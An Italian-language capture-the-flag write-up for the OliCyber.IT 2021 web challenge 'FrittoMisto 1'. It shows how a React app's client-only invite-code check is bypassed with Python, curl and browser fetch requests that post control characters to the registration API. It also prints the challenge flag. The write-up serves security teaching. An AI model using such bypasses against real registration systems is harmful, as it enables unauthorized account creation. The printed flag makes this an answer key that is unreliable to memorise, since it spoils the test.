Ecco la documentazione tecnica e la guida alla soluzione (writeup) per la challenge.

---

# Writeup: [web-01] FrittoMisto 1

* **Competizione:** OliCyber.IT 2021 – Competizione Nazionale
* **Categoria:** Web Security / Client-Side Reversing
* **Punteggio/Difficoltà:** Web 01 (37 risoluzioni)
* **Target:** `[http://frittomisto.challs.olicyber.it/](http://frittomisto.challs.olicyber.it/)`
* **Flag:** `flag{b3nv3nut0_n3l_m10_f4nt4st1c0_s1t0_bu0n_l4v0r0}`

---

## 1. Analisi Iniziale & Vulnerabilità

L'applicazione web presenta una piattaforma in costruzione sviluppata come Single Page Application in **React**.

1. **Client-Side Validation:** Tentando la registrazione (`/registrati`), l'errore `Codice di invito invalido!` compare istantaneamente senza che venga inviata alcuna chiamata di rete verso il backend.
2. **Reversing del bundle JavaScript:** Ispezionando i file sorgente tramite i DevTools (o esaminando `main.chunk.js`), si individua la logica di validazione del codice invito eseguita prima del submit:

```javascript
if (inviteCode.length !== 10) {
  console.log("Codice di invito invalido!");
  props.setError("Codice di invito invalido!");
  return;
}
for (let idx = 0; idx < 10; idx++) {
  if (inviteCode.charCodeAt(idx) != idx) {
    console.log("Codice di invito invalido!");
    props.setError("Codice di invito invalido!");
    return;
  }
}

```

### Dettagli Tecnici del Codice Invito

* La stringa deve essere lunga esattamente **10 caratteri**.
* Il carattere in posizione `idx` deve avere codice ASCII pari a `idx` (per `idx` da $0$ a $9$).
* I caratteri corrispondono ai primi 10 caratteri di controllo ASCII non stampabili (`0x00` a `0x09`), rendendo impossibile l'inserimento manuale tramite i normali campi di input del browser.

---

## 2. Requisiti di Registrazione & Specifiche JSON

* **Endpoint backend:** `/api/register`
* **Metodo:** `POST`
* **Content-Type:** `application/json`
* **Vincoli sui campi:**
* `username` $\ge$ 10 caratteri
* `password` $\ge$ 10 caratteri
* `invite`: sequenza ASCII `0x00` – `0x09`

> **Nota sulla formattazione JSON:**
> Nello standard JSON (RFC 8259) i caratteri di controllo Unicode richiedono la forma a 4 cifre `\u0000`–`\u0009`. Le sequenze esadecimali in stile C (`\x00`) non sono valide all'interno di un raw payload JSON e causano un errore `400 Bad Request`.

---

## 3. Soluzione

### Metodo 1: Script Python (`requests`)

Python gestisce nativamente la serializzazione JSON convertendo automaticamente le sequenze di byte o caratteri.

```python
#!/usr/bin/env python3
import requests

URL = "http://frittomisto.challs.olicyber.it/api/register"

# Costruzione del codice invito con codici ASCII da 0 a 9
invite_code = "".join([chr(i) for i in range(10)])

payload = {
    "username": "ludovico12345",
    "password": "ludovico12345",
    "invite": invite_code
}

response = requests.post(URL, json=payload)
print(response.json())

```

---

### Metodo 2: Chiamata CLI con `curl`

Utilizzando l'escape standard Unicode per JSON (`\u0000` fino a `\u0009`):

```bash
curl -X POST http://frittomisto.challs.olicyber.it/api/register \
     -H "Content-Type: application/json" \
     -d '{"username": "ludovico12345", "password": "ludovico12345", "invite": "\u0000\u0001\u0002\u0003\u0004\u0005\u0006\u0007\u0008\u0009"}'

```

---

### Metodo 3: Console JavaScript del Browser (`fetch`)

Eseguibile direttamente dalla tab Console (`F12`) della pagina web:

```javascript
fetch("/api/register", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({
    username: "ludovico12345",
    password: "ludovico12345",
    invite: Array.from({ length: 10 }, (_, i) => String.fromCharCode(i)).join("")
  })
})
.then(res => res.json())
.then(console.log);

```

---

## 4. Risposta del Server

Inviando la richiesta correttamente formattata, il server valida la registrazione e restituisce la flag:

```json
{
  "flag": "flag{b3nv3nut0_n3l_m10_f4nt4st1c0_s1t0_bu0n_l4v0r0}",
  "success": "Registrazione effettuata con successo"
}

```
